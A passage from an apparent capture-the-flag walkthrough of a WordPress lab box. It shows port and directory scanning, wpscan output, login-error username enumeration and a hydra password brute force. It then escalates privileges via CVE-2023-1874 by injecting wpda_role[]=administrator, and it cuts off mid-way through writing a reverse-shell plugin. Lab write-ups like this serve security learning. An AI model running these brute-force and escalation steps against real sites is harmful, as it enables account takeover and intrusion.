</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPKq6PCdkc7tlJ9u/XcYjAfE8S8bOYjQe4+3teDY9e24Hfh7Qc3kXDIN52yu+ijvM7ZhcWwwLqikpNzqbhCQq8Ytf60lqNTPvekszBOP4xCJJWm2roGNftNu+IAIWgar7vOhHxLlniLdIt514pbiG2ZPZGxVdBHb7WsVVGUuM+b0AQOH7S9FLXBVqngrlrXUhhBsYtREfZxs4k+AE4N2ajcCEtPcdiLybPXddOD4GgM0nSwpTwlDehZ2NWVETT6ibQjl8T7WGogeIq1oO/LyOjLeu6MKuchp1H5FkIqe+wyZtRhjAsyKjrCGrCV4QM004AtcR/NjHaK7vvEqvRKOYmCmk7IotV/AtAD37GEu+qX0SePWVbZ8DweVIHYBPbJv1nCXkAy+T8eoj1dnvCgKsfz7L5PbkWucfF+gwzGTHwq2n9TrEOy99p6MStNv8ZBkXBY+2moD0ahZA3f6qYuvjlH4uVTCzXnbLxGTK0hdWGvT4PvC0vGh661mmaIhI3Ag0<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 <span class=nv>AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPeQGv1A7372SDcT2mRIrMxbQaXJ1RA1ibSYWQ6WJxPH5YZCEQzSTHh5eTrum2k0SvIjmPyLfsoVmmOoPZGaR1g</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAuvMwyWKUHQmG5CUtHi/vQ5F2fhnT8k0jGo18znKuHQ
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>60</span> Apache httpd 2.4.56 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Apache2 Debian Default Page: It works
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.56 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>We got port <code>22(ssh)</code> and port <code>80(Apache Server)</code> opened.</p><p>Let&rsquo;s start with Apache server.</p><p><figure><img src=/posts/breakme/1.png title=breakme.thm:80 style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>breakme.thm:80</strong></figcaption></figure>We got default Apache web page in port 80. Lets fuzz the web app.</p><h3 id=fuff>fuff</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ffuf -u http://breakme.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt 
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>.htaccess               <span class=o>[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 2253ms<span class=o>]</span>
</span></span><span class=line><span class=cl>.htpasswd               <span class=o>[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3269ms<span class=o>]</span>
</span></span><span class=line><span class=cl>manual                  <span class=o>[</span>Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 330ms<span class=o>]</span>
</span></span><span class=line><span class=cl>server-status           <span class=o>[</span>Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 221ms<span class=o>]</span>
</span></span><span class=line><span class=cl>wordpress               <span class=o>[</span>Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 205ms<span class=o>]</span>
</span></span></code></pre></div><p>We got few interesting results by fuzzing. In that <code>wordpress</code> is very interesting. Lets start with that.</p><h3 id=wpscan>wpscan</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ wpscan --url http://breakme.thm/wordpress/ --api-token <span class=nv>$wp_token</span>
</span></span><span class=line><span class=cl>_______________________________________________________________
</span></span><span class=line><span class=cl>         __          _______   _____
</span></span><span class=line><span class=cl>         <span class=se>\ \ </span>       / /  __ <span class=se>\ </span>/ ____<span class=p>|</span>
</span></span><span class=line><span class=cl>          <span class=se>\ \ </span> /<span class=se>\ </span> / /<span class=p>|</span> <span class=p>|</span>__<span class=o>)</span> <span class=p>|</span> <span class=o>(</span>___   ___  __ _ _ __ ¬Æ
</span></span><span class=line><span class=cl>           <span class=se>\ \/</span>  <span class=se>\/</span> / <span class=p>|</span>  ___/ <span class=se>\_</span>__ <span class=se>\ </span>/ __<span class=p>|</span>/ _<span class=sb>`</span> <span class=p>|</span> <span class=s1>&#39;&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>            <span class=se>\ </span> /<span class=se>\ </span> /  <span class=p>|</span> <span class=p>|</span>     ____<span class=o>)</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>             <span class=se>\/</span>  <span class=se>\/</span>   <span class=p>|</span>_<span class=p>|</span>    <span class=p>|</span>_____/ <span class=se>\_</span>__<span class=p>|</span><span class=se>\_</span>_,_<span class=p>|</span>_<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         WordPress Security Scanner by the WPScan Team
</span></span><span class=line><span class=cl>                         Version 3.8.27
</span></span><span class=line><span class=cl>       Sponsored by Automattic - https://automattic.com/
</span></span><span class=line><span class=cl>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
</span></span><span class=line><span class=cl>_______________________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> URL: http://breakme.thm/wordpress/ <span class=o>[</span>10.10.90.220<span class=o>]</span>
</span></span><span class=line><span class=cl>Interesting Finding<span class=o>(</span>s<span class=o>)</span>:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Headers
</span></span><span class=line><span class=cl> <span class=p>|</span> Interesting Entry: Server: Apache/2.4.56 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Headers <span class=o>(</span>Passive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Confidence: 100%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> XML-RPC seems to be enabled: http://breakme.thm/wordpress/xmlrpc.php
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Direct Access <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Confidence: 100%
</span></span><span class=line><span class=cl> <span class=p>|</span> References:
</span></span><span class=line><span class=cl> <span class=p>|</span>  - http://codex.wordpress.org/XML-RPC_Pingback_API
</span></span><span class=line><span class=cl> <span class=p>|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
</span></span><span class=line><span class=cl> <span class=p>|</span>  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
</span></span><span class=line><span class=cl> <span class=p>|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
</span></span><span class=line><span class=cl> <span class=p>|</span>  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> WordPress readme found: http://breakme.thm/wordpress/readme.html
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Direct Access <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Confidence: 100%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The external WP-Cron seems to be enabled: http://breakme.thm/wordpress/wp-cron.php
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Direct Access <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Confidence: 60%
</span></span><span class=line><span class=cl> <span class=p>|</span> References:
</span></span><span class=line><span class=cl> <span class=p>|</span>  - https://www.iplocation.net/defend-wordpress-from-ddos
</span></span><span class=line><span class=cl> <span class=p>|</span>  - https://github.com/wpscanteam/wpscan/issues/1299
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> WordPress version 6.4.3 identified <span class=o>(</span>Insecure, released on 2024-01-30<span class=o>)</span>.
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Rss Generator <span class=o>(</span>Passive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>  - http://breakme.thm/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v<span class=o>=</span>6.4.3&lt;/generator&gt;
</span></span><span class=line><span class=cl> <span class=p>|</span>  - http://breakme.thm/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span class=o>=</span>6.4.3&lt;/generator&gt;
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> <span class=m>4</span> vulnerabilities identified:
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: WP &lt; 6.5.2 - Unauthenticated Stored XSS
</span></span><span class=line><span class=cl> <span class=p>|</span>     Fixed in: 6.4.4
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpscan.com/vulnerability/1a5c5df1-57ee-4190-a336-b0266962078f
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wordpress.org/news/2024/04/wordpress-6-5-2-maintenance-and-security-release/
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: WordPress &lt; 6.5.5 - Contributor+ Stored XSS in HTML API
</span></span><span class=line><span class=cl> <span class=p>|</span>     Fixed in: 6.4.5
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: WordPress &lt; 6.5.5 - Contributor+ Stored XSS in Template-Part Block
</span></span><span class=line><span class=cl> <span class=p>|</span>     Fixed in: 6.4.5
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: WordPress &lt; 6.5.5 - Contributor+ Path Traversal in Template-Part Block
</span></span><span class=line><span class=cl> <span class=p>|</span>     Fixed in: 6.4.5
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> WordPress theme in use: twentytwentyfour
</span></span><span class=line><span class=cl> <span class=p>|</span> Location: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/
</span></span><span class=line><span class=cl> <span class=p>|</span> Last Updated: 2024-07-16T00:00:00.000Z
</span></span><span class=line><span class=cl> <span class=p>|</span> Readme: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/readme.txt
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> The version is out of date, the latest version is 1.2
</span></span><span class=line><span class=cl> <span class=p>|</span> Style URL: http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css
</span></span><span class=line><span class=cl> <span class=p>|</span> Style Name: Twenty Twenty-Four
</span></span><span class=line><span class=cl> <span class=p>|</span> Style URI: https://wordpress.org/themes/twentytwentyfour/
</span></span><span class=line><span class=cl> <span class=p>|</span> Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
</span></span><span class=line><span class=cl> <span class=p>|</span> Author: the WordPress team
</span></span><span class=line><span class=cl> <span class=p>|</span> Author URI: https://wordpress.org
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Urls In Homepage <span class=o>(</span>Passive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Version: 1.0 <span class=o>(</span>80% confidence<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Style <span class=o>(</span>Passive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>  - http://breakme.thm/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: <span class=s1>&#39;Version: 1.0&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Enumerating All Plugins <span class=o>(</span>via Passive Methods<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Checking Plugin Versions <span class=o>(</span>via Passive and Aggressive Methods<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>i<span class=o>]</span> Plugin<span class=o>(</span>s<span class=o>)</span> Identified:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> wp-data-access
</span></span><span class=line><span class=cl> <span class=p>|</span> Location: http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/
</span></span><span class=line><span class=cl> <span class=p>|</span> Last Updated: 2024-09-18T00:01:00.000Z
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> The version is out of date, the latest version is 5.5.14
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Urls In Homepage <span class=o>(</span>Passive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> <span class=m>3</span> vulnerabilities identified:
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: WP Data Access &lt; 5.3.8 - Subscriber+ Privilege Escalation
</span></span><span class=line><span class=cl> <span class=p>|</span>     Fixed in: 5.3.8
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpscan.com/vulnerability/7871b890-5172-40aa-88f2-a1b95e240ad4
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2023-1874
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: Freemius SDK &lt; 2.5.10 - Reflected Cross-Site Scripting
</span></span><span class=line><span class=cl> <span class=p>|</span>     Fixed in: 5.3.11
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpscan.com/vulnerability/39d1f22f-ea34-4d94-9dc2-12661cf69d36
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2023-33999
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> <span class=o>[</span>!<span class=o>]</span> Title: WP Data Access &lt; 5.5.9 - Cross-Site Request Forgery
</span></span><span class=line><span class=cl> <span class=p>|</span>     Fixed in: 5.5.9
</span></span><span class=line><span class=cl> <span class=p>|</span>     References:
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://wpscan.com/vulnerability/4fe0d330-6511-4500-ac3f-b9bb944b8f0e
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2024-43295
</span></span><span class=line><span class=cl> <span class=p>|</span>      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85a33508-71f2-4aa1-8d51-667eb0690fbd
</span></span><span class=line><span class=cl> <span class=p>|</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Version: 5.3.5 <span class=o>(</span>80% confidence<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Found By: Readme - Stable Tag <span class=o>(</span>Aggressive Detection<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=p>|</span>  - http://breakme.thm/wordpress/wp-content/plugins/wp-data-access/readme.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Enumerating Config Backups <span class=o>(</span>via Passive and Aggressive Methods<span class=o>)</span>
</span></span><span class=line><span class=cl> Checking Config Backups - Time: 00:00:06 &lt;<span class=o>==============================================================================</span>&gt; <span class=o>(</span><span class=m>137</span> / 137<span class=o>)</span> 100.00% Time: 00:00:06
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>i<span class=o>]</span> No Config Backups Found.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> WPScan DB API OK
</span></span><span class=line><span class=cl> <span class=p>|</span> Plan: free
</span></span><span class=line><span class=cl> <span class=p>|</span> Requests Done <span class=o>(</span>during the scan<span class=o>)</span>: <span class=m>3</span>
</span></span><span class=line><span class=cl> <span class=p>|</span> Requests Remaining: <span class=m>22</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Finished: Tue Sep <span class=m>24</span> 19:27:35 <span class=m>2024</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Requests Done: <span class=m>144</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Cached Requests: <span class=m>37</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Data Sent: 38.903 KB
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Data Received: 28.153 KB
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Memory used: 247.871 MB
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Elapsed time: 00:00:12
</span></span></code></pre></div><p>We used wpscan tool to enumarate data from the webserver and got some vulnerability details.</p><ul><li><p><strong>WordPress version 6.4.3</strong></p><ol><li>WP &lt; 6.5.2 - Unauthenticated Stored XSS</li><li>WordPress &lt; 6.5.5 - Contributor+ Stored XSS in HTML API</li><li>WordPress &lt; 6.5.5 - Contributor+ Stored XSS in Template-Part Block</li><li>WordPress &lt; 6.5.5 - Contributor+ Path Traversal in Template-Part Block</li></ol></li><li><p><strong>WordPress theme: twentytwentyfour Version: 1.0</strong></p></li><li><p><strong>WordPress plugin: wp-data-access Version: 5.3.5</strong></p><ol><li>WP Data Access &lt; 5.3.8 - Subscriber+ Privilege Escalation (CVE-2023-1874)</li><li>Freemius SDK &lt; 2.5.10 - Reflected Cross-Site Scripting (CVE-2023-33999)</li><li>WP Data Access &lt; 5.5.9 - Cross-Site Request Forgery (CVE-2024-43295)</li></ol></li></ul><p>These are the list of vulnerabilities given by wpscan tool. Here the interesting part is vulnerability in plugins specifically <code>WP Data Access &lt; 5.3.8 - Subscriber+ Privilege Escalation (CVE-2023-1874)</code>. Lets enumarate more data.</p><h3 id=wordpress-site>Wordpress site</h3><p><figure><img src=/posts/breakme/2.png title=breakme.thm/wordpress/ style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>breakme.thm/wordpress/</strong></figcaption></figure>Home page of wordpress web app.</p><p><figure><img src=/posts/breakme/3.png title=Wordpress:SamplePage style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Wordpress:SamplePage</strong></figcaption></figure>Found link to admin login page here.</p><p><figure><img src=/posts/breakme/4.png title="Admin Login Page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Admin Login Page</strong></figcaption></figure>We got Admin login page here.</p><p><figure><img src=/posts/breakme/5.png title="Login with wrong password" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Login with wrong password</strong></figcaption></figure>When trying to login with wrong password we are getting <code>The password you entered for the username admin is incorrect.</code> response.</p><p><figure><img src=/posts/breakme/6.png title="Login with wrong Username/Email Address" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Login with wrong Username/Email Address</strong></figcaption></figure>When trying to login with wrong username we are getting <code>The username admin1 is not registered on this site. If you are unsure of your username, try your email address instead.</code> response.</p><p>We can use this behaviour for bruteforcing the username and password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ hydra -l admin -P /usr/share/wordlists/rockyou.txt breakme.thm http-post-form <span class=s2>&#34;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:The password you entered for the username&#34;</span>
</span></span></code></pre></div><p>No valid passwords found using hydra for admin user.</p><h3 id=curl-to-check-usernames-and-passwords>Curl to check Usernames and Passwords</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl http://breakme.thm/wordpress/wp-login.php -d <span class=s2>&#34;log=admin1&amp;pwd=admin1&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1&#34;</span> -H <span class=s2>&#34;Cookie: wordpress_test_cookie=WP%20Cookie%20check&#34;</span> <span class=p>|</span> grep <span class=s2>&#34;is not registered on this site.&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl http://breakme.thm/wordpress/wp-login.php -d <span class=s2>&#34;log=admin&amp;pwd=admin&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1&#34;</span> -H <span class=s2>&#34;Cookie: wordpress_test_cookie=WP%20Cookie%20check&#34;</span> <span class=p>|</span> grep <span class=s2>&#34;The password you entered for the username&#34;</span>
</span></span></code></pre></div><p>Above curl command to check the username and password.</p><h3 id=valid-users-using-hydra>Valid Users using HYDRA</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ hydra -L /usr/share/SecLists-master/Usernames/Names/names.txt -p testPassword breakme.thm http-post-form <span class=s2>&#34;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:H=Cookie\: wordpress_test_cookie=WP%20Cookie%20check:F=is not registered on this site.&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>80<span class=o>][</span>http-post-form<span class=o>]</span> host: breakme.thm   login: admin   password: testPassword
</span></span><span class=line><span class=cl><span class=o>[</span>80<span class=o>][</span>http-post-form<span class=o>]</span> host: breakme.thm   login: bob   password: testPassword
</span></span></code></pre></div><p>We got 2 valid userName <code>admin</code> and <code>bob</code>. Here <code>admin</code> is default username with high privilige account, <code>bob</code> should be the normal user account in the site.<br>Lets try brute forcing the passwords of those users.</p><h3 id=hydra-bobs-password>hydra (bob&rsquo;s password)</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ hydra -l bob -P /usr/share/wordlists/rockyou.txt breakme.thm http-post-form <span class=s2>&#34;/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fbreakme.thm%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:H=Cookie\: wordpress_test_cookie=WP%20Cookie%20check:F=The password you entered for the username&#34;</span>
</span></span><span class=line><span class=cl>Hydra v9.5 <span class=o>(</span>c<span class=o>)</span> <span class=m>2023</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>80<span class=o>][</span>http-post-form<span class=o>]</span> host: breakme.thm   login: bob   password: soccer
</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
</span></span></code></pre></div><p>We got a valid password for user <code>bob</code> and password is <code>soccer</code>.</p><p><figure><img src=/posts/breakme/7.png title=Bob:Dashboard style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Bob:Dashboard</strong></figcaption></figure>Now we can login as user <code>Bob</code>. And in dashboard, we can see the last published blog, no other important information found here.</p><p><figure><img src=/posts/breakme/8.png title=Bob:Profile style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Bob:Profile</strong></figcaption></figure>In profile page we can update and customize the user profile.<br><strong>Note</strong>:This account doesn&rsquo;t have privileged access on WordPress.</p><p>Now lets check for useful information from the vulnerabilities found by wpscan.</p><h3 id=cve-2023-1874>CVE-2023-1874</h3><p>Now while looking into the vulnerabilities list which we got from wpscan, we have the same scenario as <a href=https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/ target=_blank rel=noopener><code>Wordfence Intelligence:CVE-2023-1874</code></a>
. Lets try to exploit it.</p><figure><img src=/posts/breakme/9.png title="Wordfence Intelligence:CVE-2023-1874" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Wordfence Intelligence:CVE-2023-1874</strong></figcaption></figure><p>Lets intercept the profile update request using burpsuite and modify the request.</p><p><figure><img src=/posts/breakme/10.png title="Appending wpda_role[]=administrator" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Appending wpda_role[]=administrator</strong></figcaption></figure>We appended the <code>wpda_role[]=administrator</code> parameter in the profile update request.</p><p><figure><img src=/posts/breakme/11.png title="Administrator Dashboard" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Administrator Dashboard</strong></figcaption></figure>And now we got the administrator privilege on wordpress account. Lets try to get shell using this.</p><h3 id=reverse-shell>Reverse shell</h3><p>Lets have a look at how to get a reverse shell using WP Plugin. Here are some useful pages <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#php-plugin target=_blank rel=noopener>Hacktricks:PHP plugin</a>
, <a href=https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell target=_blank rel=noopener>Sevenlayers:PHP plugin</a>
and <a href=https://github.com/wetw0rk/malicious-wordpress-plugin/tree/master target=_blank rel=noopener>wetw0rk/malicious-wordpress-plugin</a>
.</p><p>I&rsquo;m using <code>Sevenlayers:PHP plugin</code> which is working fine for me.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;&lt;?php                                                              
</span></span></span><span class=line><span class=cl><span class=s2>/**
</span></span></span><span class=line><span class=cl><span class=s2>* Plugin Name: RevShell Plugin
</span></span></span><span class=line><span class=cl><span class=s2>* Plugin URI:
